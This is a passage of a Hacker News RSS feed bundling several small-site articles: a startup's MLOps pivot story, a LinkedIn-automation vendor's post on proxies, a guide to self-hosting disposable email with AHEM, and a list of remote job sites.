
<p>In this example, you used imperfect data to let you do something you wouldn’t otherwise. You made data a king and ended up being ruled by a tyrant.</p>

<p>Second, if you really care about something, considering showing up with data. Otherwise, you’ll be at a disadvantage if someone else does.</p>

<h2 id="summary">Summary</h2>

<p>Data, like any power, should be wielded with respect, humility, and caution. However, unlike most power, you should be wielding it regularly.</p>

    




  </div></div>]]>
            </description>
            <link>https://staysaasy.com/product/2020/12/24/data.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558260</guid>
            <pubDate>Mon, 28 Dec 2020 11:03:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We successfully pivoted a SaaS business to open-source MLOps tooling]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25558076">thread link</a>) | @benkoller
<br/>
December 28, 2020 | https://blog.maiot.io/a-most-unusual-year/ | <a href="https://web.archive.org/web/*/https://blog.maiot.io/a-most-unusual-year/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="post-content">
    <div id="blogpost">
        <p>As this is the end of the year, itâ€™s a great chance to remind yourself: how did we get here?</p>

<p>Let me beginn with a flashback to 2019. As a company, weâ€™re focussed on optimising remaining useful live of industrial assets through clever use of Machine Learning for predictive analysis, root-cause analysis and other forms of reasoning. We managed to secure a few big projects and very promising POCs, and across the board we were able to show good results. One of our projects even got government funding, providing a nice runway going forward.</p>

<p>We got the traditionally lengthy sales cycles with many leading industry players started, and we even hired our first full-time employee.</p>

<p>All was set up for first commercial success of our approach and our â€œasset optimisation platformâ€� in 2020.</p>

<p>Then the pandemic hit. Within a few weeks, all our sales leads fizzled away - millions of euros in deal sizes, disappeared in thin air. By March, we were looking at an empty sales funnel.</p>

<p>We had find a new path. We took stock, and we acted entrepreneurial.</p>

<h2 id="a-look-at-what-weve-got">A look at what weâ€™ve got</h2>

<p>Taking stock of what we actually had, in terms of intellectual property, was a great recap of our journey so far <a href="https://www.youtube.com/watch?v=UDfxoKmc8qc">(if youâ€™re interested, check out a talk I recently gave on what we learned about ML pipelines)</a>. To summarise, we had to our name:</p>

<ul>
  <li>A great team (experienced ML engineers, Ops expertise and a good entrepreneurial fit)</li>
  <li>A purpose-built tech stack for reproducible ML pipelines</li>
  <li>Experience running small and large projects</li>
  <li>A good network of other startups and developers in ML-related positions across the globe</li>
</ul>

<h2 id="talking-to-people">Talking to people</h2>

<p>We saw the economic effects of the pandemic very early - at least from an european perspective. After taking close stock, we had to understand how (and if) Machine Learning would continue to play a role for our leads and network. Taking a page out of the great UX researchers Iâ€™ve had the chance to work with over my career, we decided to do user interviews. Lo and behold, after doing ~30 early interviews, a picture emerged.</p>

<p>Teams engaged in ML projects lost significant chunks of time on unrepeatable projects as well as managing dysfunctional franken-infrastructures. Teams not yet engaged in ML feared it to be a black hole for time and effort to build up a reliable tech stack for getting experiments into production, as existing systems would need integration at many stages of the ML lifecycle.</p>

<p>An interesting side-fact became clear to us, too: there was a lot of scepticism towards ML-based SaaS products, but a lot of trust towards dev-tooling.</p>

<p>More importantly, however - we had solved exactly the problems our interviewees faced for ourselves. We were sitting on something commercially relevant, and we were looking at a great opportunity.</p>

<h2 id="understanding-your-market-part-one">Understanding your market, part one</h2>

<p>With this new-found confirmation we set out to transform our tech-stack from internal-facing supportive tooling to an actual product. Looking at the market, a split was noticeable.</p>

<p>On the one side, open-source tooling like Kubeflow and MLFlow was solving aspects of the MLOps problem space, but posed significant investments to the teams we were talking to in our interviews. Tooling was either missing the point of Data Scientists, or alienated product leads and DevOps teams with convoluted, messy or badly documented paths from experiment to production.</p>

<p>On the other side were very expensive commercial solutions, attempting to solve large chunks of the ML lifecycle with proprietary offerings.</p>

<h2 id="commercial-first">Commercial-first</h2>

<p>Given the layout of the MLOps market, we spotted an opportunity to flip the proverbial table. Donâ€™t get me wrong, weâ€™re not radical geniuses, we much rather are interested observers of entrepreneurial trends. Given the success of Stripe, Segment and others, this constellation of players screamed â€œtransactional business modelâ€� to us. A managed MLOps platform to train models easily in various public clouds, at linearly scaling prices, based on actual usage, not arbitrary license models or per-seat, and at a fraction of the going rates.</p>

<h2 id="understanding-the-market-part-two">Understanding the market, part two</h2>

<p>By now we know: Our hypothesis, teams are just waiting for a managed MLOps solution with usage-based pricing and reproducible pipelines as focus, was off. This was not immediately clear to us, of course.</p>

<p>One of our smartest plays saved us in the end - we never stopped doing user interviews. We demoâ€™ed our product status quo multiple times per week, we had two soft-launches and continuously engaged with the community on conferences, reddit, slack - you name it.</p>

<p>And people loved our take on MLOps. Our vision resonated deeply. All model trainings are guaranteed to be reproducible, tracking is deeply baked-in, integrations to popular tooling are easy and extensible - these are the key concerns of the teams we were talking to.</p>

<p>However, it would have been ludicrous to switch their tech-stacks to a commercial solution. No, if we wanted to drive adoption and actually have an impact on how the world dealt with MLOps, we had to give these teams the option to adopt our vision in their projects on their own terms. We had to open-source.</p>

<p>As Iâ€™ve written in the past, <a href="http://blog.maiot.io/open-source">we are huge proponents of open-source software</a>. Large parts of our own tooling would be possible without the work of open-source giants, on whose shoulders we can stand.</p>

<h2 id="the-jury-is-still-out">The jury is still out</h2>

<p>As of writing this, the jury is still out if weâ€™re leaving the dent in the universe that we want to leave behind. But, and this is a hugely rewarding feeling, we have all the right indications that we nailed it this time. Weâ€™ve breached 200 GitHub stars in less than a week of going public, weâ€™ve been on the front page of Hackernews, weâ€™ve been trending on GitHub, and ZenML is racing to 1000 <code>pip install</code>â€™s.</p>

<p>If youâ€™re running ML projects, or just personally got curious, head over to <a href="https://github.com/maiot-io/zenml">ZenMLâ€™s GitHub page</a> and get started with reproducible Machine Learning!</p>

    </div>
</section></div>]]>
            </description>
            <link>https://blog.maiot.io/a-most-unusual-year/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558076</guid>
            <pubDate>Mon, 28 Dec 2020 10:17:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LinkedIn Automation Might Get You Blocked]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25558068">thread link</a>) | @nevodavid
<br/>
December 28, 2020 | https://linvo.io/2020/12/05/linkedin-automation-might-get-you-blocke/ | <a href="https://web.archive.org/web/*/https://linvo.io/2020/12/05/linkedin-automation-might-get-you-blocke/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div data-elementor-type="wp-post" data-elementor-id="6857" data-elementor-settings="[]">
<div>
<div>
<section data-id="67b36beb" data-element_type="section">


</section>
<section data-id="21484a18" data-element_type="section">
<div>
<div>
<div data-id="721c971b" data-element_type="column">
<div>
<div>
<div data-id="3e1cb47f" data-element_type="widget" data-widget_type="heading.default">
<p>
<h2>Linkedin Automation Might Get You Blocked.</h2> </p>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="31d5200b" data-element_type="section">
<div>
<div>
<div data-id="9067bd9" data-element_type="column">
<div>
<div>
<div data-id="123ed40c" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>Nowadays many companies offering unique features for automating Linkedin<span>.<br></span></p><p><b>But let’s dive in to how Linkedin Automation works.</b></p><p>Automation tools are logging into your LinkedIn and perform actions (clicks).</p><p>There are three kinds of automation:</p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="506e178b" data-element_type="section">
<div>
<div>
<div data-id="5a025cf" data-element_type="column">
<div>
<div>
<div data-id="a46508b" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><span>1). <b>Login with Linkedin username and password.</b></span></p><p><span><b>It can be via the web or an application.</b></span></p><p><b>Cons:</b></p><p>* It’s saves you Linkedin username and password. That’s a little scary.</p><p>* It’s creating a new login device in your account – and here is the tricky part, most Linkedin Automations tools login from from a Linux operating system, that’s a big no-no.</p><p><b>Pros:</b></p><p><b>* </b>They can relog themselves to Linkedin in case of a disconnection – without you needing to do anything.</p></div>
</div>
</div>
</div>
</div>
</div>
<div data-id="2ef26dde" data-element_type="column">
<div>
<div>
<div data-id="1fef062" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="960" height="699" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-13.39.57.png" alt="" loading="lazy"> </p>
</div>
</div>
<div data-id="6e22ac16" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="960" height="159" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-13.51.27.png" alt="" loading="lazy"> </p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="707827de" data-element_type="section">
<div>
<div>
<div data-id="727c550e" data-element_type="column">
<div>
<div>
<div data-id="7bb5199e" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><span>2).&nbsp;</span><span><b>Local automation, using a chrome extension – You are the person who performs the automation.</b></span></p><p><b>Cons:</b></p><p>* Automation happens in your browser; you can’t touch it while it happens.</p><p>* Robot click – In local automation, you can’t simulate human clicks in code – Linkedin claims they can detect it.</p><p>* Elements change in page – Most chrome extensions will change your page elements – Linkedin claims they can detect it.</p><p><b>Pros:</b></p><p>* All the operations are being made by you, that’s a significant benefit.</p></div>
</div>
</div>
</div>
</div>
</div>

</div>
</div>
</section>
<section data-id="60de5cda" data-element_type="section">
<div>
<div>
<div data-id="5dd8bbcc" data-element_type="column">
<div>
<div>
<div data-id="21286002" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><span>3). </span><b>Chrome extensions use your Linkedin cookies – </b><span><b>Recommended</b></span><b>.</b></p><p><b>Cons:</b></p><p><span><b>*</b></span><span> You need to check the permissions of the chrome extension at the google webstore.<br></span>Many companies ask for extra permissions they don’t need.<br>Make sure it can only access your Linkedin, company dashboard, and cookies.</p><p><b>Pros:</b></p><p><b>* </b>No access to your Linkedin Username and Password.</p><p><b>*</b> Not creating a new logged-in device.</p><p><b>*</b> Once you delete the extension, the extensions’ owner won’t have access to your account.</p></div>
</div>
</div>
</div>
</div>
</div>
<div data-id="545fbc1c" data-element_type="column">
<div>
<div>
<div data-id="2f2ade77" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="960" height="619" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-14.png" alt="" loading="lazy"> </p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="202bf6aa" data-element_type="section">
<div>
<div>
<div data-id="2ace1e1d" data-element_type="column">
<div>
<div>
<div data-id="5c363f53" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>In case you have chosen to use a background automated tool, there is one thing you must address.</p><p><b>The location of where your actions are being performed.</b></p><p>Most companies will hide this information from you, but this is crucial.</p><p>The worst scenario is that the Linkedin Automation tool will make actions from the computer it’s running on. That’s a big no-no.</p><p>It’s straightforward. Your account will look something like that:</p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="4d2e1c44" data-element_type="section">
<div>
<div>
<div data-id="3f09d287" data-element_type="column">
<div>
<div>
<div data-id="4f80314e" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="768" height="400" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-14.45.46.png" alt="" loading="lazy"> </p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="2ad4cb24" data-element_type="section">
<div>
<div>
<div data-id="247a88f0" data-element_type="column">
<div>
<div>
<div data-id="65a61db8" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>As you can see, the browser is “Linux” and the Owner is “Digitalocean Llc” which is telling Linkedin, <b>Hello, I am a bot.</b></p><p>To better protect you, the Linkedin automation company should require you to use a proxy. They might be able to provide it.</p><p><span><b>What is a proxy?</b></span></p><p>A proxy is a computer that sits in a different location and will make all your Linkedin actions.</p><p><b>There are two types of proxies:</b></p><p>1. Shared proxies – Multiple users using the same computer.<br>2. Dedicated proxies – Only one user can use the computer.</p><p><b>Using a shared one is dangerous&nbsp;–&nbsp;</b>Linkedin can detect that multiple users are using the same computer.</p><p>Shared ones are much cheaper, and many companies are using them – <b>Check with your company.</b></p><p>Dedicated ones are expensive –&nbsp;<b>You will be the only one using this computer.</b></p><p><b>Every proxy sits in a different location – the closer it is to you, the safer.<br></b></p><p>If I live in Israel, I probably do not want to take action from the US because it looks weird that multiple activities are happening simultaneously from different locations.</p><p>Linkedin will not ban you for using a different computer – <b>they know you might be using a VPN, which is fine.</b></p><p><b>So which Linkedin Automation tool should you use?</b></p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="6bb6f3cb" data-element_type="section">
<div>
<div>
<div data-id="5a068926" data-element_type="column">
<div>
<div>

<div data-id="734cb7a4" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>Yes, it’s us 😀</p><p>We like to believe we are <b>the safest automation tool.</b></p><p>We provide every member with a <b>dedicated proxy (not shared!).</b></p><p><b>We mimic human-mouse behavior, and also, we offer very cool features.</b></p><p>We are using <a href="https://www.webshare.io/dedicated-proxy">Webshare.io</a> for dedicated proxies.</p><p><b>It costs us $6 per month.</b></p><p>We offer <b>a limited time lifetime deal for $30, it’s going to end soon</b>&nbsp;😨</p><p><b><a href="https://appsumo.com/linvo"><u>Check our deal at AppSumo</u></a></b></p></div>
</div>
</div>
</div>
</div>
</div>
<div data-id="61c2386d" data-element_type="column">
<div>
<div>
<div data-id="883f3a6" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="960" height="482" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-15.42.24.png" alt="" loading="lazy"> </p>
</div>
</div>
<div data-id="4164c995" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="960" height="421" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-15.41.43.png" alt="" loading="lazy"> </p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</div></div>]]>
            </description>
            <link>https://linvo.io/2020/12/05/linkedin-automation-might-get-you-blocke/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558068</guid>
            <pubDate>Mon, 28 Dec 2020 10:16:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Celestial Navigation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557669">thread link</a>) | @blewboarwastake
<br/>
December 28, 2020 | http://www.siranah.de/html/sail040a.htm | <a href="https://web.archive.org/web/*/http://www.siranah.de/html/sail040a.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.siranah.de/html/sail040a.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557669</guid>
            <pubDate>Mon, 28 Dec 2020 08:33:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self-hosted disposable email addresses with AHEM]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557661">thread link</a>) | @edent
<br/>
December 28, 2020 | https://neilzone.co.uk/2020/12/self-hosted-disposable-email-addresses-with-ahem | <a href="https://web.archive.org/web/*/https://neilzone.co.uk/2020/12/self-hosted-disposable-email-addresses-with-ahem">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <div>
                                                                                <p><img src="https://neilzone.co.uk/content/images/20201227164320-Screenshot%202020-12-27%20at%2016.42.25.png" alt="Screenshot of webpage showing AHEM email service"></p>

<p>I've run my own mailserver for years now, with a <em>catch-all</em> on some domains.</p>

<p>This means that, whenever a shop or service asks for my email address, I can give them a unique address, specific to them, without needing to configure anything.</p>

<p>This has a number of uses, but the main ones for me are:</p>

<ul>
<li>if their system is compromised, my email address is of no use for credential stuffing attacks (since it is used only for that one site/service)</li>
<li>if I get spam from which I cannot unsubscribe, I can kill that email address without disrupting anything else</li>
<li>if they leak or sell my email address, and someone else uses it, I can tell</li>
</ul>

<p>One thing this setup does not do well, though, is deal with the situation in which I want a disposable email address: an email address which exists long enough to receive one email.</p>

<p>That's because, once I've given someone their unique address, they can continue sending to it, and it will continue to funnel their email into my mailbox, until I take action to stop them.</p>

<p>Sometimes, I want — well, am forced — to give over an email address just to access something. (For example, I wanted to download a cycle map from Sustrans the other day, and they insisted on having an email address, which is nonsensical as they just emailed me a link to a PDF on their website. Why not just hyperlink the PDFs from the website, and skip the hassle?! (Spoiler: probably some kind of tracking.).)</p>

<p>In that kind of situation, I want a system for disposable email addresses, which exist only for a very short period of time, and which do not clog up my mailbox.</p>



<p>There are loads of services which offer this, some free and some paid, and, to date, I've just used one of those. Since I've not used them for anything private, it didn't matter too much to me that someone else can see the content of the email.</p>

<p>Indeed, if you are looking for privacy from "hiding in a crowd", using a third party service is probably <em>preferable</em> to hosting your own service.</p>

<p>However, that trade-off was acceptable to me, and since I prefer to host my own tools, having my own setup seemed like a useful thing to have, if it was relatively easy to do.</p>

<p>And it was.</p>

<p>Relatively.</p>



<p>It took me about 30 minutes to get a disposable email server running using <a href="https://github.com/o4oren/Ad-Hoc-Email-Server">AHEM</a>.</p>

<p>The instructions on github sort of worked, and I can't tell if the bits which did not work out of the box are because of my lack of familiarity with node.js, or incomplete / no longer accurate instructions. Let's assume it's my ignorance!</p>

<p>I had a bit of a fight with angular, to make the project build, and I solved the error message by forcibly installing a particular version of it. Not ideal, but it worked.</p>

<p>After that, it built with some warnings but no more errors.</p>



<p>Since it's an email service, you need to set an MX record for the domain you want to use, pointing to a record pointing to the IP address on which you're running AHEM.</p>

<p>I chose a sub-domain of my normal domain. I'm using it for both the email addresses, and also for accessing the web server (via nginx).</p>

<p>AHEM can support multiple email domains, so if I wanted to do the same for one of Sandra's domains, it would be a simple case of adding the domain to AHEM's .env file.</p>



<p>I can understand why people do it, but it bugs me all the same: why use static files hosted by a third party CDN, rather than just hosting them yourself?</p>

<p>Out of the box, AHEM uses some JavaScript resources hosted on Cloudflare. I used wget to download the scripts, and then replaced the references in index.html with localhost references instead.</p>

<p>Bingo.</p>



<p>By default, it runs on localhost:3000. Fine for testing, but not what I wanted permanently.</p>

<p>Since I had nginx on the server already, reverse-proxying to give a web interface over port 80, using the same sub-domain as for the email address itself (although anything else would work too; they are not connected) was easy.</p>

<p>It also meant that it was trivial (using certbot) to pop a TLS certifcate on the proxy, giving me TLS over 443. Even though the web interface will be firewalled off and accessible only without our private network, I'd prefer to have TLS in place anyway.</p>

<p>I'm not sure why, but the basic config was 404'ing traffic to /socket.io/, so I added a specific <em>Location</em> section for that:</p>

<pre><code>location /socket.io/ {
    proxy_pass http://localhost:3000;       
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "Upgrade";
    proxy_set_header Host $host;
}
</code></pre>



<p>I'm not that familiar with node.js, so there might be a better way of doing this, but I was struggling to keep it running when I closed my ssh connection.</p>

<p>I could just run it as a background process (by appending &amp; to the command), but I installed  pm2:</p>

<pre><code>npm install pm2 -g
</code></pre>

<p>and then ran it using:</p>

<pre><code>pm2 start ahem.js
</code></pre>



<p>Now, I have a simple to use, self-hosted, web page, which lets me generate random email addresses to paste into webforms when I want a disposable address.</p>

<p>I need to refresh the page to check if an email has arrived, but that's fine. I should check if there's something I've not configured correctly, as I'd have thought it would refresh periodically, if nothing fancier existed to show an email when it arrives.</p>

<p>Email are deleted automatically when they are 24 hours old; again, this is something configurable via .env, but that seems fine as a default.</p>



<p>A couple of weeks ago, AHEM <a href="https://github.com/o4oren/Ad-Hoc-Email-Server/pull/41/commits/4c4bc7fb34a056ff47abc96d32c066023d7c7e37">changed its licence</a> from an in-house job to Apache 2.0.</p>

<p>This is a good decision, IMHO, but still needs to be reflected in the AHEM interface, since this says that it's only "available for personal and internal use".</p>
                    <hr>
                    
                    
                </div>
            </div>
        </div></div>]]>
            </description>
            <link>https://neilzone.co.uk/2020/12/self-hosted-disposable-email-addresses-with-ahem</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557661</guid>
            <pubDate>Mon, 28 Dec 2020 08:30:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best Remote Job Sites to Find Your Dream Job]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25557608">thread link</a>) | @ofou
<br/>
December 28, 2020 | https://www.digitalnomadsoul.com/best-remote-job-sites/ | <a href="https://web.archive.org/web/*/https://www.digitalnomadsoul.com/best-remote-job-sites/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><div><div><p>Maybe you are looking for a job you can do from home because you are tired of your daily commute or because you want to spend more time with your family. Maybe you want to travel a bit more and that’s why you are looking for a location-independent position. No matter what your reason is, online jobs are more popular than ever before. Check out the best remote job sites to find an online job you can do anywhere and anytime.</p><h2><span id="How_Important_Are_Online_Jobs"></span>How Important Are Online Jobs?<span></span></h2><p>Before we jump right into the list, let’s have a look at some facts and numbers.</p><p>40% of the entire American workforce will be doing <a href="https://www.officevibe.com/blog/11-incredible-coworking-statistics-infographic" target="_blank" rel="noopener noreferrer">freelance work in 2020</a>. There are estimations, that <a href="https://levels.io/future-of-digital-nomads/" target="_blank" rel="noopener noreferrer">by the year 2035 there will be 1 billion digital nomads</a> on this planet. That means that remote jobs will become more and more important. People are realizing, that the location-independent lifestyle has many advantages. The Digital Nomad Survey from 2016 shows, what people like most about this lifestyle:</p><ul><li>It gives them a better work/life balance than office work.</li><li>85% of all digital nomads feel happier with this lifestyle.</li><li>They are less stressed when they do telecommuting work.</li><li>They also enjoy schedule flexibility, the fact that they can work from home and don’t have to commute anymore.</li></ul><p>The industry has taken note of that, too. By the end of 2017, more than <a href="http://www.deskmag.com/en/the-complete-2017-coworking-forecast-more-than-one-million-people-work-from-14000-coworking-spaces-s" target="_blank" rel="noopener noreferrer">14,000 coworking spaces</a> will be in operation around the world, providing location-independent professionals an alternative working environment.</p><p>Moreover, remote job sites are booming and new websites dedicated to online jobs are appearing on a regular basis. These websites show not only open positions for<strong> freelancers</strong>, but also for people who seek to work in a <strong>permanent contract</strong> with a company, but on a remote basis.</p><p>Some of these websites are free to use, but you have to pay a certain fee once you close a deal or a certain percentage of the agreed payment. Other websites charge you to search for jobs, but you don’t have to pay anything once you close a contract. Very few are entirely free to use.</p><p>The following list includes the most popular remote job sites out there. Have a look around and find the platform that works best for you.</p><p><img loading="lazy" src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-1024x682.jpg" alt="Remote Job Sites, Digital Nomad, Online Job, Make Money Online, Location-Independent Job, Job Search, Hire Remote Worker, Freelancer" width="515" height="343" srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4.jpg 1024w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-300x200.jpg 300w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-768x512.jpg 768w" sizes="(max-width: 515px) 100vw, 515px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20515%20343'%3E%3C/svg%3E" data-lazy-srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4.jpg 1024w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-300x200.jpg 300w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-768x512.jpg 768w" data-lazy-src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-4-1024x682.jpg"></p><h2><span id="The_Best_Remote_Job_Sites"></span>The Best Remote Job Sites<span></span></h2><h3><span id="FlexJobs"></span>FlexJobs<span></span></h3><p><a href="http://flexjobsrocks.go2cloud.org/aff_c?offer_id=1&amp;aff_id=1722" target="_blank" rel="nofollow noopener noreferrer">Flexjobs </a>is focused on part-time, full-time and flexible remote jobs and has more than 100 job categories.&nbsp; All jobs are hand-screened so you can be sure it’s not a scam. Here you can also find jobs with reputable companies, such as Apple, Dell or the American Red Cross.</p><p>In addition to that, it provides resources for things like skills testing or research the company that is hiring. Brilliant website for everyone who is just at the beginning of their remote career!</p><h3><span id="99Designs"></span>99Designs<span></span></h3><p><a href="https://99designs.com/" target="_blank" rel="noopener noreferrer">99 Designs</a> is the perfect job site for you if you have some great graphic design skills. You can find project work and also meet longer-term clients.</p><h3><span id="AngeList"></span>AngeList<span></span></h3><p><a href="https://angel.co/" target="_blank" rel="noopener noreferrer">AngelList </a>is very popular for its great list of startup jobs. You can find jobs in all fields, such as finance or engineering. Simply apply the remote filter option to display location-independent positions only.</p><h3><span id="Apres"></span>Après<span></span></h3><p><a href="https://apresgroup.com/" target="_blank" rel="noopener noreferrer">Après&nbsp;</a>is the perfect remote job site for moms who want to have a flexible job. You can find freelance or contract based jobs here, full-time or part-time ones at startups, media, and tech industries.</p><h3><span id="Authentic_Jobs"></span>Authentic Jobs<span></span></h3><p><a href="https://www.authenticjobs.com/" target="_blank" rel="noopener noreferrer">Authentic Jobs</a> is a website that offers both local, and remote jobs. It has a variety of positions for designers, creative professionals and hackers and provides a lot of extra information around the jobs.</p><h3><span id="Axiom_Law"></span>Axiom Law<span></span></h3><p><a href="https://www.axiomlaw.com/" target="_blank" rel="noopener noreferrer">Axiom law</a> is basically a digital law firm that places attorneys either in local or in remote positions. If you are looking for an alternative to a traditional law firm, this is your place to be.</p><h3><span id="Career_Builder"></span>Career Builder<span></span></h3><p>Many big and well-known companies trust <a href="http://www.careerbuilder.com/" target="_blank" rel="noopener noreferrer">Career Builder</a> to find their new talents. You can create a profile and search for certain employment types and compensation.</p><h3><span id="CloudPeeps"></span>CloudPeeps<span></span></h3><p><a href="https://www.cloudpeeps.com/" target="_blank" rel="noopener noreferrer">CloudPeeps</a> connects freelancers and clients mainly in the fields of content creation, marketing, social media and community building. Gigs are usually between 30 and 150 USD per hour.</p><h3><span id="Crossover"></span>Crossover<span></span></h3><p><a href="https://www.crossover.com/#index" target="_blank" rel="noopener noreferrer">Crossover</a> offers local and remote jobs by some very popular companies. This is one of the few remote job sites that offer fulltime long-term careers only, each of them high paying. Jobs are in any field from marketing to executive management, to software development.</p><h3><span id="Dribble_Jobs"></span>Dribble Jobs<span></span></h3><p><a href="https://dribbble.com/jobs" target="_blank" rel="noopener noreferrer">Dribble Jobs </a>is specifically for designers and offers mainly local jobs, but has an extra filter for remote positions, too.</p><h3><span id="EuropeRemotely"></span>EuropeRemotely<span></span></h3><p><a href="http://europeremotely.com/" target="_blank" rel="noopener noreferrer">EuropeRemotely</a> lists only jobs for people who are based in European time zones. Although that is a bit unusual for remote job sites, it does make sense. It also offers jobs for developers only.</p><h3><span id="F6s"></span>F6s<span></span></h3><p><a href="https://www.f6s.com/" target="_blank" rel="noopener noreferrer">F6s</a> is a popular website for startup organizations to find their talents. It lets you filter out the remote positions and you can search by equity and compensation.</p><h3><span id="Fiverr"></span>Fiverr<span></span></h3><p>Freelancers can offer their services on<a href="https://www.fiverr.com/" target="_blank" rel="noopener noreferrer"> Fiverr </a>for clients to book them. These gigs often start from 5 USD per service and can be anything from IT support, to content writing, to marketing work, or something completely different, like performing a custom rap song.</p><h3><span id="Freelancer"></span>Freelancer<span></span></h3><p><a href="https://www.freelancer.com/" target="_blank" rel="noopener noreferrer">Freelancer</a> is one of the most popular remote job sites, which connects freelancers of all kinds to employers. You can either work on a fixed price basis, charge hourly rates or bid and participate in contests.</p><h3><span id="Freelancermap"></span>Freelancermap<span></span></h3><p><a href="https://www.freelancermap.com/" target="_blank" rel="noopener noreferrer">Freelancermap</a> is a platform where IT professionals and businesses come together. The average project pays about 200 USD and is all about IT.</p><p><img loading="lazy" src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5.jpg" alt="Remote Job Sites, Digital Nomad, Online Job, Make Money Online, Location-Independent Job, Job Search, Hire Remote Worker, Freelancer" width="512" height="340" srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5.jpg 724w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5-300x199.jpg 300w" sizes="(max-width: 512px) 100vw, 512px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20512%20340'%3E%3C/svg%3E" data-lazy-srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5.jpg 724w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5-300x199.jpg 300w" data-lazy-src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-5.jpg"></p><h3><span id="GrowthGeeks"></span>GrowthGeeks<span></span></h3><p>As you can tell from the name, <a href="http://www.growthgeeks.com/" target="_blank" rel="noopener noreferrer">GrowthGeeks </a>is a marketplace that is specialized in growing startups and businesses. While you can find many different jobs here, the majority focus on generating growth via social media or marketing projects.</p><h3><span id="Guru"></span>Guru<span></span></h3><p><a href="https://www.guru.com/" target="_blank" rel="noopener noreferrer">Guru</a> is a platform that lists location-independent jobs only. They offer a wide range of positions, often focused on web development, content writing or translation.</p><h3><span id="Hubstaff_Talent"></span>Hubstaff Talent<span></span></h3><p><a href="https://talent.hubstaff.com/" target="_blank" rel="noopener noreferrer">Hubstaff Talent</a> is a rather new remote job site, that connects freelancers and businesses for free. Offered jobs are in any field from web development to customer service to content writing.</p><h3><span id="Idealist"></span>Idealist<span></span></h3><p><a href="http://idealistcareers.org/tag/remote-jobs/" target="_blank" 